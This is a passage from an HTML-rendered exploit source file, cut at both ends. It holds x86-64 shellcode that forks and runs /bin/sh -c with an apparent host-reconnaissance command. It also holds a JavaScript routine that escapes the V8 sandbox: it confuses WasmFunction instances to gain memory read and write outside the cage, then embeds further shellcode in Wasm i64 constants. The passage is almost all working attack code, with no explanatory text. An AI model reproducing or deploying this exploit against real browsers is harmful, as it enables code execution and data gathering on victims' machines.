0x05,                              // 35: SYSCALL</td></tr><tr><td class="line-number" value="2607"></td><td class="line-content">0x41, 0x59,                              // 36: POP r9</td></tr><tr><td class="line-number" value="2608"></td><td class="line-content">0x45, 0x89, 0xc8,                        // 37: MOV r8d, r9d</td></tr><tr><td class="line-number" value="2609"></td><td class="line-content">0x49, 0xc1, 0xe9, 0x20,                  // 38: SHR r9, 32</td></tr><tr><td class="line-number" value="2610"></td><td class="line-content">0xb8, 0x39, 0x00, 0x00, 0x00,            // 39: MOV eax, 57</td></tr><tr><td class="line-number" value="2611"></td><td class="line-content">0x0f, 0x05,                              // 40: SYSCALL</td></tr><tr><td class="line-number" value="2612"></td><td class="line-content">0x48, 0x85, 0xc0,                        // 41: TEST rax, rax</td></tr><tr><td class="line-number" value="2613"></td><td class="line-content">0x0f, 0x85, 0x8b, 0x01, 0x00, 0x00,      // 42: JNZ :parent =&gt; 0x0220</td></tr><tr><td class="line-number" value="2614"></td><td class="line-content">// Fork Child</td></tr><tr><td class="line-number" value="2615"></td><td class="line-content">// dup2(link[1], STDOUT_FILENO);</td></tr><tr><td class="line-number" value="2616"></td><td class="line-content">0xb8, 0x21, 0x00, 0x00, 0x00,            // 43: MOV eax, 33</td></tr><tr><td class="line-number" value="2617"></td><td class="line-content">0x4c, 0x89, 0xcf,                        // 44: MOV rdi, r9</td></tr><tr><td class="line-number" value="2618"></td><td class="line-content">0xbe, 0x01, 0x00, 0x00, 0x00,            // 45: MOV esi, 1</td></tr><tr><td class="line-number" value="2619"></td><td class="line-content">0x0f, 0x05,                              // 46: SYSCALL</td></tr><tr><td class="line-number" value="2620"></td><td class="line-content">// close(link[0])</td></tr><tr><td class="line-number" value="2621"></td><td class="line-content">0xb8, 0x03, 0x00, 0x00, 0x00,            // 47: MOV eax, 3</td></tr><tr><td class="line-number" value="2622"></td><td class="line-content">0x4c, 0x89, 0xc7,                        // 48: MOV rdi, r8</td></tr><tr><td class="line-number" value="2623"></td><td class="line-content">0x0f, 0x05,                              // 49: SYSCALL</td></tr><tr><td class="line-number" value="2624"></td><td class="line-content">// close(link[1])</td></tr><tr><td class="line-number" value="2625"></td><td class="line-content">0xb8, 0x03, 0x00, 0x00, 0x00,            // 50: MOV eax, 3</td></tr><tr><td class="line-number" value="2626"></td><td class="line-content">0x4c, 0x89, 0xcf,                        // 51: MOV rdi, r9</td></tr><tr><td class="line-number" value="2627"></td><td class="line-content">0x0f, 0x05,                              // 52: SYSCALL</td></tr><tr><td class="line-number" value="2628"></td><td class="line-content">0x31, 0xc0,                              // 53: XOR eax, eax</td></tr><tr><td class="line-number" value="2629"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 54: SHL rax, 32</td></tr><tr><td class="line-number" value="2630"></td><td class="line-content">0x48, 0x83, 0xc8, 0x00,                  // 55: OR rax, 0</td></tr><tr><td class="line-number" value="2631"></td><td class="line-content">0x50,                                    // 56: PUSH rax</td></tr><tr><td class="line-number" value="2632"></td><td class="line-content">0x31, 0xc0,                              // 57: XOR eax, eax</td></tr><tr><td class="line-number" value="2633"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 58: SHL rax, 32</td></tr><tr><td class="line-number" value="2634"></td><td class="line-content">0x48, 0x83, 0xc8, 0x00,                  // 59: OR rax, 0</td></tr><tr><td class="line-number" value="2635"></td><td class="line-content">0x50,                                    // 60: PUSH rax</td></tr><tr><td class="line-number" value="2636"></td><td class="line-content">0xb8, 0x2f, 0x2f, 0x73, 0x68,            // 61: MOV eax, 1752379183</td></tr><tr><td class="line-number" value="2637"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 62: SHL rax, 32</td></tr><tr><td class="line-number" value="2638"></td><td class="line-content">0x48, 0x0d, 0x2f, 0x62, 0x69, 0x6e,      // 63: OR rax, 1852400175</td></tr><tr><td class="line-number" value="2639"></td><td class="line-content">0x50,                                    // 64: PUSH rax</td></tr><tr><td class="line-number" value="2640"></td><td class="line-content">0x54,                                    // 65: PUSH rsp</td></tr><tr><td class="line-number" value="2641"></td><td class="line-content">0x41, 0x58,                              // 66: POP r8</td></tr><tr><td class="line-number" value="2642"></td><td class="line-content">0x31, 0xc0,                              // 67: XOR eax, eax</td></tr><tr><td class="line-number" value="2643"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 68: SHL rax, 32</td></tr><tr><td class="line-number" value="2644"></td><td class="line-content">0x48, 0x83, 0xc8, 0x00,                  // 69: OR rax, 0</td></tr><tr><td class="line-number" value="2645"></td><td class="line-content">0x50,                                    // 70: PUSH rax</td></tr><tr><td class="line-number" value="2646"></td><td class="line-content">0x31, 0xc0,                              // 71: XOR eax, eax</td></tr><tr><td class="line-number" value="2647"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 72: SHL rax, 32</td></tr><tr><td class="line-number" value="2648"></td><td class="line-content">0x48, 0x0d, 0x2d, 0x63, 0x00, 0x00,      // 73: OR rax, 25389</td></tr><tr><td class="line-number" value="2649"></td><td class="line-content">0x50,                                    // 74: PUSH rax</td></tr><tr><td class="line-number" value="2650"></td><td class="line-content">0x54,                                    // 75: PUSH rsp</td></tr><tr><td class="line-number" value="2651"></td><td class="line-content">0x41, 0x59,                              // 76: POP r9</td></tr><tr><td class="line-number" value="2652"></td><td class="line-content">0x31, 0xc0,                              // 77: XOR eax, eax</td></tr><tr><td class="line-number" value="2653"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 78: SHL rax, 32</td></tr><tr><td class="line-number" value="2654"></td><td class="line-content">0x48, 0x83, 0xc8, 0x00,                  // 79: OR rax, 0</td></tr><tr><td class="line-number" value="2655"></td><td class="line-content">0x50,                                    // 80: PUSH rax</td></tr><tr><td class="line-number" value="2656"></td><td class="line-content">0x31, 0xc0,                              // 81: XOR eax, eax</td></tr><tr><td class="line-number" value="2657"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 82: SHL rax, 32</td></tr><tr><td class="line-number" value="2658"></td><td class="line-content">0x48, 0x83, 0xc8, 0x3b,                  // 83: OR rax, 59</td></tr><tr><td class="line-number" value="2659"></td><td class="line-content">0x50,                                    // 84: PUSH rax</td></tr><tr><td class="line-number" value="2660"></td><td class="line-content">0xb8, 0x64, 0x20, 0x2d, 0x31,            // 85: MOV eax, 825040996</td></tr><tr><td class="line-number" value="2661"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 86: SHL rax, 32</td></tr><tr><td class="line-number" value="2662"></td><td class="line-content">0x48, 0x0d, 0x20, 0x68, 0x65, 0x61,      // 87: OR rax, 1634035744</td></tr><tr><td class="line-number" value="2663"></td><td class="line-content">0x50,                                    // 88: PUSH rax</td></tr><tr><td class="line-number" value="2664"></td><td class="line-content">0xb8, 0x78, 0x65, 0x20, 0x7c,            // 89: MOV eax, 2082497912</td></tr><tr><td class="line-number" value="2665"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 90: SHL rax, 32</td></tr><tr><td class="line-number" value="2666"></td><td class="line-content">0x48, 0x0d, 0x49, 0x44, 0x2f, 0x65,      // 91: OR rax, 1697596489</td></tr><tr><td class="line-number" value="2667"></td><td class="line-content">0x50,                                    // 92: PUSH rax</td></tr><tr><td class="line-number" value="2668"></td><td class="line-content">0xb8, 0x2f, 0x24, 0x50, 0x50,            // 93: MOV eax, 1347429423</td></tr><tr><td class="line-number" value="2669"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 94: SHL rax, 32</td></tr><tr><td class="line-number" value="2670"></td><td class="line-content">0x48, 0x0d, 0x70, 0x72, 0x6f, 0x63,      // 95: OR rax, 1668248176</td></tr><tr><td class="line-number" value="2671"></td><td class="line-content">0x50,                                    // 96: PUSH rax</td></tr><tr><td class="line-number" value="2672"></td><td class="line-content">0xb8, 0x2b, 0x27, 0x20, 0x2f,            // 97: MOV eax, 790636331</td></tr><tr><td class="line-number" value="2673"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 98: SHL rax, 32</td></tr><tr><td class="line-number" value="2674"></td><td class="line-content">0x48, 0x0d, 0x30, 0x2d, 0x39, 0x5d,      // 99: OR rax, 1564028208</td></tr><tr><td class="line-number" value="2675"></td><td class="line-content">0x50,                                    // 100: PUSH rax</td></tr><tr><td class="line-number" value="2676"></td><td class="line-content">0xb8, 0x7d, 0x5c, 0x2e, 0x5b,            // 101: MOV eax, 1529764989</td></tr><tr><td class="line-number" value="2677"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 102: SHL rax, 32</td></tr><tr><td class="line-number" value="2678"></td><td class="line-content">0x48, 0x0d, 0x39, 0x5d, 0x7b, 0x34,      // 103: OR rax, 880500025</td></tr><tr><td class="line-number" value="2679"></td><td class="line-content">0x50,                                    // 104: PUSH rax</td></tr><tr><td class="line-number" value="2680"></td><td class="line-content">0xb8, 0x2e, 0x5b, 0x30, 0x2d,            // 105: MOV eax, 758143790</td></tr><tr><td class="line-number" value="2681"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 106: SHL rax, 32</td></tr><tr><td class="line-number" value="2682"></td><td class="line-content">0x48, 0x0d, 0x5c, 0x2e, 0x30, 0x5c,      // 107: OR rax, 1546661468</td></tr><tr><td class="line-number" value="2683"></td><td class="line-content">0x50,                                    // 108: PUSH rax</td></tr><tr><td class="line-number" value="2684"></td><td class="line-content">0xb8, 0x5d, 0x7b, 0x33, 0x7d,            // 109: MOV eax, 2100525917</td></tr><tr><td class="line-number" value="2685"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 110: SHL rax, 32</td></tr><tr><td class="line-number" value="2686"></td><td class="line-content">0x48, 0x0d, 0x5b, 0x30, 0x2d, 0x39,      // 111: OR rax, 959262811</td></tr><tr><td class="line-number" value="2687"></td><td class="line-content">0x50,                                    // 112: PUSH rax</td></tr><tr><td class="line-number" value="2688"></td><td class="line-content">0xb8, 0x45, 0x6f, 0x20, 0x27,            // 113: MOV eax, 656437061</td></tr><tr><td class="line-number" value="2689"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 114: SHL rax, 32</td></tr><tr><td class="line-number" value="2690"></td><td class="line-content">0x48, 0x0d, 0x70, 0x20, 0x2d, 0x61,      // 115: OR rax, 1630347376</td></tr><tr><td class="line-number" value="2691"></td><td class="line-content">0x50,                                    // 116: PUSH rax</td></tr><tr><td class="line-number" value="2692"></td><td class="line-content">0xb8, 0x20, 0x67, 0x72, 0x65,            // 117: MOV eax, 1701996320</td></tr><tr><td class="line-number" value="2693"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 118: SHL rax, 32</td></tr><tr><td class="line-number" value="2694"></td><td class="line-content">0x48, 0x0d, 0x69, 0x6d, 0x65, 0x3b,      // 119: OR rax, 996502889</td></tr><tr><td class="line-number" value="2695"></td><td class="line-content">0x50,                                    // 120: PUSH rax</td></tr><tr><td class="line-number" value="2696"></td><td class="line-content">0xb8, 0x2f, 0x75, 0x70, 0x74,            // 121: MOV eax, 1953527087</td></tr><tr><td class="line-number" value="2697"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 122: SHL rax, 32</td></tr><tr><td class="line-number" value="2698"></td><td class="line-content">0x48, 0x0d, 0x70, 0x72, 0x6f, 0x63,      // 123: OR rax, 1668248176</td></tr><tr><td class="line-number" value="2699"></td><td class="line-content">0x50,                                    // 124: PUSH rax</td></tr><tr><td class="line-number" value="2700"></td><td class="line-content">0xb8, 0x61, 0x74, 0x20, 0x2f,            // 125: MOV eax, 790656097</td></tr><tr><td class="line-number" value="2701"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 126: SHL rax, 32</td></tr><tr><td class="line-number" value="2702"></td><td class="line-content">0x48, 0x0d, 0x65, 0x3b, 0x20, 0x63,      // 127: OR rax, 1663056741</td></tr><tr><td class="line-number" value="2703"></td><td class="line-content">0x50,                                    // 128: PUSH rax</td></tr><tr><td class="line-number" value="2704"></td><td class="line-content">0xb8, 0x20, 0x64, 0x61, 0x74,            // 129: MOV eax, 1952539680</td></tr><tr><td class="line-number" value="2705"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 130: SHL rax, 32</td></tr><tr><td class="line-number" value="2706"></td><td class="line-content">0x48, 0x0d, 0x20, 0x2d, 0x61, 0x3b,      // 131: OR rax, 996224288</td></tr><tr><td class="line-number" value="2707"></td><td class="line-content">0x50,                                    // 132: PUSH rax</td></tr><tr><td class="line-number" value="2708"></td><td class="line-content">0xb8, 0x6e, 0x61, 0x6d, 0x65,            // 133: MOV eax, 1701667182</td></tr><tr><td class="line-number" value="2709"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 134: SHL rax, 32</td></tr><tr><td class="line-number" value="2710"></td><td class="line-content">0x48, 0x0d, 0x64, 0x3b, 0x20, 0x75,      // 135: OR rax, 1965046628</td></tr><tr><td class="line-number" value="2711"></td><td class="line-content">0x50,                                    // 136: PUSH rax</td></tr><tr><td class="line-number" value="2712"></td><td class="line-content">0xb8, 0x3b, 0x20, 0x70, 0x77,            // 137: MOV eax, 2003836987</td></tr><tr><td class="line-number" value="2713"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 138: SHL rax, 32</td></tr><tr><td class="line-number" value="2714"></td><td class="line-content">0x48, 0x0d, 0x6e, 0x61, 0x6d, 0x65,      // 139: OR rax, 1701667182</td></tr><tr><td class="line-number" value="2715"></td><td class="line-content">0x50,                                    // 140: PUSH rax</td></tr><tr><td class="line-number" value="2716"></td><td class="line-content">0xb8, 0x68, 0x6f, 0x73, 0x74,            // 141: MOV eax, 1953722216</td></tr><tr><td class="line-number" value="2717"></td><td class="line-content">0x48, 0xc1, 0xe0, 0x20,                  // 142: SHL rax, 32</td></tr><tr><td class="line-number" value="2718"></td><td class="line-content">0x48, 0x0d, 0x69, 0x64, 0x3b, 0x20,      // 143: OR rax, 540763241</td></tr><tr><td class="line-number" value="2719"></td><td class="line-content">0x50,                                    // 144: PUSH rax</td></tr><tr><td class="line-number" value="2720"></td><td class="line-content">0x54,                                    // 145: PUSH rsp</td></tr><tr><td class="line-number" value="2721"></td><td class="line-content">0x41, 0x5a,                              // 146: POP r10</td></tr><tr><td class="line-number" value="2722"></td><td class="line-content">0x6a, 0x00,                              // 147: PUSH 0</td></tr><tr><td class="line-number" value="2723"></td><td class="line-content">0x41, 0x52,                              // 148: PUSH r10</td></tr><tr><td class="line-number" value="2724"></td><td class="line-content">0x41, 0x51,                              // 149: PUSH r9</td></tr><tr><td class="line-number" value="2725"></td><td class="line-content">0x41, 0x50,                              // 150: PUSH r8</td></tr><tr><td class="line-number" value="2726"></td><td class="line-content">0x54,                                    // 151: PUSH rsp</td></tr><tr><td class="line-number" value="2727"></td><td class="line-content">0x41, 0x5a,                              // 152: POP r10</td></tr><tr><td class="line-number" value="2728"></td><td class="line-content">0xb8, 0x3b, 0x00, 0x00, 0x00,            // 153: MOV eax, 59</td></tr><tr><td class="line-number" value="2729"></td><td class="line-content">0x4c, 0x89, 0xd6,                        // 154: MOV rsi, r10</td></tr><tr><td class="line-number" value="2730"></td><td class="line-content">0x48, 0x8b, 0x3e,                        // 155: MOV rdi, [rsi]</td></tr><tr><td class="line-number" value="2731"></td><td class="line-content">0x48, 0x31, 0xd2,                        // 156: XOR rdx, rdx</td></tr><tr><td class="line-number" value="2732"></td><td class="line-content">0x0f, 0x05,                              // 157: SYSCALL</td></tr><tr><td class="line-number" value="2733"></td><td class="line-content">// parent [0x0220]:</td></tr><tr><td class="line-number" value="2734"></td><td class="line-content">// Fork Parent</td></tr><tr><td class="line-number" value="2735"></td><td class="line-content">// close(link[1])</td></tr><tr><td class="line-number" value="2736"></td><td class="line-content">0xb8, 0x03, 0x00, 0x00, 0x00,            // 158: MOV eax, 3</td></tr><tr><td class="line-number" value="2737"></td><td class="line-content">0x4c, 0x89, 0xcf,                        // 159: MOV rdi, r9</td></tr><tr><td class="line-number" value="2738"></td><td class="line-content">0x0f, 0x05,                              // 160: SYSCALL</td></tr><tr><td class="line-number" value="2739"></td><td class="line-content">0xba, 0x00, 0x10, 0x00, 0x00,            // 161: MOV edx, 4096</td></tr><tr><td class="line-number" value="2740"></td><td class="line-content">// read [0x022f]:</td></tr><tr><td class="line-number" value="2741"></td><td class="line-content">// read(link[0], rbx, 4096)</td></tr><tr><td class="line-number" value="2742"></td><td class="line-content">0x48, 0x31, 0xc0,                        // 162: XOR rax, rax</td></tr><tr><td class="line-number" value="2743"></td><td class="line-content">0x4c, 0x89, 0xc7,                        // 163: MOV rdi, r8</td></tr><tr><td class="line-number" value="2744"></td><td class="line-content">0x48, 0x89, 0xde,                        // 164: MOV rsi, rbx</td></tr><tr><td class="line-number" value="2745"></td><td class="line-content">0x0f, 0x05,                              // 165: SYSCALL</td></tr><tr><td class="line-number" value="2746"></td><td class="line-content">0x48, 0x01, 0xc3,                        // 166: ADD rbx, rax</td></tr><tr><td class="line-number" value="2747"></td><td class="line-content">0x29, 0xc2,                              // 167: SUB edx, eax</td></tr><tr><td class="line-number" value="2748"></td><td class="line-content">0x48, 0x85, 0xc0,                        // 168: TEST rax, rax</td></tr><tr><td class="line-number" value="2749"></td><td class="line-content">0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 169: JNZ :read =&gt; 0x022f</td></tr><tr><td class="line-number" value="2750"></td><td class="line-content">// close(link[0])</td></tr><tr><td class="line-number" value="2751"></td><td class="line-content">0xb8, 0x03, 0x00, 0x00, 0x00,            // 170: MOV eax, 3</td></tr><tr><td class="line-number" value="2752"></td><td class="line-content">0x4c, 0x89, 0xc7,                        // 171: MOV rdi, r8</td></tr><tr><td class="line-number" value="2753"></td><td class="line-content">0x0f, 0x05,                              // 172: SYSCALL</td></tr><tr><td class="line-number" value="2754"></td><td class="line-content">// Return value RETURN_STRING</td></tr><tr><td class="line-number" value="2755"></td><td class="line-content">0x68, 0x00, 0x02, 0x00, 0x00,            // 173: PUSH 512</td></tr><tr><td class="line-number" value="2756"></td><td class="line-content">0x58,                                    // 174: POP rax</td></tr><tr><td class="line-number" value="2757"></td><td class="line-content">// return [0x0258]:</td></tr><tr><td class="line-number" value="2758"></td><td class="line-content">0xc3,                                    // 175: RET</td></tr><tr><td class="line-number" value="2759"></td><td class="line-content">]);</td></tr><tr><td class="line-number" value="2760"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2761"></td><td class="line-content">async function v8sandbox(primitives) {</td></tr><tr><td class="line-number" value="2762"></td><td class="line-content">    const offsets = init({</td></tr><tr><td class="line-number" value="2763"></td><td class="line-content">        function_shared_info: 0x10,</td></tr><tr><td class="line-number" value="2764"></td><td class="line-content">        shred_info_wasm_function: 0x04,</td></tr><tr><td class="line-number" value="2765"></td><td class="line-content">        wasm_function_instance: 0x10,</td></tr><tr><td class="line-number" value="2766"></td><td class="line-content">        // instance_jmptable: 0x50,</td></tr><tr><td class="line-number" value="2767"></td><td class="line-content">        instance_jmptable: 0x50 - 8,</td></tr><tr><td class="line-number" value="2768"></td><td class="line-content">        cagedAddressOffset: 0x40018,</td></tr><tr><td class="line-number" value="2769"></td><td class="line-content">        arrayBufferBackingOffset: 0x20,</td></tr><tr><td class="line-number" value="2770"></td><td class="line-content">    });</td></tr><tr><td class="line-number" value="2771"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2772"></td><td class="line-content">    let {addrOf, cagedRead, cagedWrite} = primitives;</td></tr><tr><td class="line-number" value="2773"></td><td class="line-content">    let cageBase = (cagedRead(BigInt(offsets.cagedAddressOffset)) &amp; 0xffffffff00000000n);</td></tr><tr><td class="line-number" value="2774"></td><td class="line-content">    await console.log(`Cage Base`, to_hex(cageBase));</td></tr><tr><td class="line-number" value="2775"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2776"></td><td class="line-content">    async function confuse(instance, srcinstance, func) {</td></tr><tr><td class="line-number" value="2777"></td><td class="line-content">        let func_addr = addrOf(func);</td></tr><tr><td class="line-number" value="2778"></td><td class="line-content">        let shared_info_addr = cagedRead(func_addr + BigInt(offsets.function_shared_info)) &amp; 0xffffffffn;</td></tr><tr><td class="line-number" value="2779"></td><td class="line-content">        await console.log(`Shared Info Addr`, to_hex(shared_info_addr));</td></tr><tr><td class="line-number" value="2780"></td><td class="line-content">        let wasm_func_addr = cagedRead(shared_info_addr + BigInt(offsets.shred_info_wasm_function)) &amp; 0xffffffffn;</td></tr><tr><td class="line-number" value="2781"></td><td class="line-content">        await console.log(`Wasm Function Addr`, to_hex(wasm_func_addr));</td></tr><tr><td class="line-number" value="2782"></td><td class="line-content">        let instance_addr = cagedRead(wasm_func_addr + BigInt(offsets.wasm_function_instance)) &amp; 0xffffffffn;</td></tr><tr><td class="line-number" value="2783"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2784"></td><td class="line-content">        if (instance_addr == addrOf(srcinstance)) {</td></tr><tr><td class="line-number" value="2785"></td><td class="line-content">            cagedWrite(wasm_func_addr + BigInt(offsets.wasm_function_instance), addrOf(instance));</td></tr><tr><td class="line-number" value="2786"></td><td class="line-content">            console.log(`Confused WasmFunction: ${to_hex(instance_addr)} -&gt; ${to_hex(addrOf(srcinstance))}`);</td></tr><tr><td class="line-number" value="2787"></td><td class="line-content">            return;</td></tr><tr><td class="line-number" value="2788"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2789"></td><td class="line-content">       </td></tr><tr><td class="line-number" value="2790"></td><td class="line-content">        throw new Error(`Failed to confuse WasmFunction`);</td></tr><tr><td class="line-number" value="2791"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2792"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2793"></td><td class="line-content">    async function readwrite_factory() {</td></tr><tr><td class="line-number" value="2794"></td><td class="line-content">        let target_builder = new WasmModuleBuilder();</td></tr><tr><td class="line-number" value="2795"></td><td class="line-content">        target_builder.addMemory(1, 1);</td></tr><tr><td class="line-number" value="2796"></td><td class="line-content">        target_builder.exportMemoryAs("memory");</td></tr><tr><td class="line-number" value="2797"></td><td class="line-content">        target_builder.addFunction("read", makeSig([kWasmI32], [kWasmI64])).exportFunc().addBody([</td></tr><tr><td class="line-number" value="2798"></td><td class="line-content">            kExprLocalGet, 0, </td></tr><tr><td class="line-number" value="2799"></td><td class="line-content">            kExprI64LoadMem, 0, 0</td></tr><tr><td class="line-number" value="2800"></td><td class="line-content">        ]);</td></tr><tr><td class="line-number" value="2801"></td><td class="line-content">        target_builder.addFunction("write", makeSig([kWasmI64, kWasmI32], [])).exportFunc().addBody([</td></tr><tr><td class="line-number" value="2802"></td><td class="line-content">            kExprLocalGet, 1,</td></tr><tr><td class="line-number" value="2803"></td><td class="line-content">            kExprLocalGet, 0,</td></tr><tr><td class="line-number" value="2804"></td><td class="line-content">            kExprI64StoreMem, 0, 0,</td></tr><tr><td class="line-number" value="2805"></td><td class="line-content">        ]);</td></tr><tr><td class="line-number" value="2806"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2807"></td><td class="line-content">        let confused_builder = new WasmModuleBuilder();</td></tr><tr><td class="line-number" value="2808"></td><td class="line-content">        confused_builder.addFunction("read", makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([</td></tr><tr><td class="line-number" value="2809"></td><td class="line-content">            ...wasmI64Const(1),</td></tr><tr><td class="line-number" value="2810"></td><td class="line-content">        ]);</td></tr><tr><td class="line-number" value="2811"></td><td class="line-content">        confused_builder.addFunction("write", makeSig([kWasmI64, kWasmI64], [])).exportFunc().addBody([</td></tr><tr><td class="line-number" value="2812"></td><td class="line-content">        ]);</td></tr><tr><td class="line-number" value="2813"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2814"></td><td class="line-content">        let target_instance = target_builder.instantiate();</td></tr><tr><td class="line-number" value="2815"></td><td class="line-content">        let confused_instance = confused_builder.instantiate();</td></tr><tr><td class="line-number" value="2816"></td><td class="line-content">        await confuse(target_instance, confused_instance, confused_instance.exports.read);</td></tr><tr><td class="line-number" value="2817"></td><td class="line-content">        await confuse(target_instance, confused_instance, confused_instance.exports.write);</td></tr><tr><td class="line-number" value="2818"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2819"></td><td class="line-content">        let memoryBase = (cagedRead(addrOf(target_instance.exports.memory.buffer) + BigInt(offsets.arrayBufferBackingOffset)) &gt;&gt; 24n) + cageBase;</td></tr><tr><td class="line-number" value="2820"></td><td class="line-content">        // console.log(`memoryBase`, to_hex(memoryBase));</td></tr><tr><td class="line-number" value="2821"></td><td class="line-content">        return {</td></tr><tr><td class="line-number" value="2822"></td><td class="line-content">            memRead: (addr) =&gt; {</td></tr><tr><td class="line-number" value="2823"></td><td class="line-content">                // console.log(`memRead`, to_hex(addr), to_hex(addr - memoryBase));</td></tr><tr><td class="line-number" value="2824"></td><td class="line-content">                return confused_instance.exports.read((addr - memoryBase) &amp; 0xfffffffffffffffen);</td></tr><tr><td class="line-number" value="2825"></td><td class="line-content">            },</td></tr><tr><td class="line-number" value="2826"></td><td class="line-content">            memWrite: (addr, value) =&gt; {</td></tr><tr><td class="line-number" value="2827"></td><td class="line-content">                // console.log(`memWrite`, to_hex(addr), to_hex(addr - memoryBase));</td></tr><tr><td class="line-number" value="2828"></td><td class="line-content">                return confused_instance.exports.write(value, (addr - memoryBase) &amp; 0xfffffffffffffffen);</td></tr><tr><td class="line-number" value="2829"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2830"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2831"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2832"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2833"></td><td class="line-content">    try {</td></tr><tr><td class="line-number" value="2834"></td><td class="line-content">        let iomemAddr = addrOf(iomem.buffer);</td></tr><tr><td class="line-number" value="2835"></td><td class="line-content">        let iomemBacking = BigInt(cagedRead(iomemAddr + BigInt(offsets.arrayBufferBackingOffset)) &gt;&gt; 24n) + cageBase;</td></tr><tr><td class="line-number" value="2836"></td><td class="line-content">        // await console.log("iomemBacking:", to_hex(iomemBacking));</td></tr><tr><td class="line-number" value="2837"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2838"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2839"></td><td class="line-content">        let wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x86, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x01, 0x7e, 0x01, 0x7e, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x04, 0x84, 0x80, 0x80, 0x80, 0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x82, 0x80, 0x80, 0x00, 0x01, 0x84, 0x82, 0x80, 0x80, 0x00, 0x00, 0x42, 0xcc, 0x99, 0xb3, 0xe6, 0xcc, 0x99, 0xb3, 0xe6, 0x4c, 0x20, 0x00, 0x86, 0x42, 0x90, 0xa1, 0xc2, 0x84, 0x89, 0x92, 0xe4, 0xf5, 0x05, 0x85, 0x42, 0xc8, 0x92, 0x8e, 0xde, 0x8e, 0xa1, 0xc0, 0x80, 0x01, 0x85, 0x42, 0xc8, 0xe2, 0xfc, 0xdf, 0x8e, 0xc1, 0xc0, 0x80, 0x01, 0x85, 0x42, 0xbe, 0x81, 0xc0, 0x80, 0x80, 0xe0, 0xba, 0x83, 0x03, 0x85, 0x42, 0xba, 0x8f, 0x80, 0x80, 0x80, 0xe0, 0xba, 0x83, 0x04, 0x85, 0x42, 0xc1, 0xf4, 0x8a, 0x81, 0x80, 0x80, 0xc0, 0xf5, 0x05, 0x85, 0x42, 0xcd, 0xe2, 0x80, 0xde, 0x8e, 0xc1, 0xc1, 0x80, 0x01, 0x85, 0x42, 0xc9, 0x86, 0xa2, 0x8f, 0xb0, 0xfd, 0xc1, 0x83, 0x01, 0x85, 0x42, 0xcd, 0xe2, 0xa4, 0xde, 0x8e, 0x81, 0xc2, 0x80, 0x01, 0x85, 0x42, 0xb8, 0x93, 0x80, 0x80, 0x80, 0xe0, 0xba, 0x83, 0x09, 0x85, 0x42, 0x8f, 0x8a, 0xac, 0xcf, 0xa0, 0xa1, 0xc0, 0x80, 0x01, 0x85, 0x42, 0xcd, 0xe2, 0xa4, 0xde, 0x8e, 0xe1, 0xc2, 0x80, 0x01, 0x85, 0x42, 0xc8, 0xe2, 0xa4, 0xde, 0x8e, 0x81, 0xc3, 0x80, 0x01, 0x85, 0x42, 0xcc, 0x96, 0xf2, 0xd8, 0xbc, 0xfd, 0xc1, 0x86, 0x01, 0x85, 0x42, 0xcc, 0x92, 0xf2, 0xc0, 0xbc, 0xfd, 0x81, 0x87, 0x01, 0x85, 0x42, 0xcc, 0x92, 0xb2, 0xd8, 0xbc, 0xfd, 0xc1, 0x87, 0x01, 0x85, 0x42, 0xc8, 0xfe, 0x87, 0xde, 0x8e, 0x81, 0xc4, 0x80, 0x01, 0x85, 0x42, 0x81, 0xf3, 0xff, 0x8f, 0x80, 0x80, 0xc0, 0xf5, 0x05, 0x85, 0x42, 0x8f, 0x8a, 0xe6, 0xfd, 0xff, 0xff, 0xff, 0xf5, 0x05, 0x85, 0x42, 0xc8, 0xa6, 0xae, 0xcf, 0xb0, 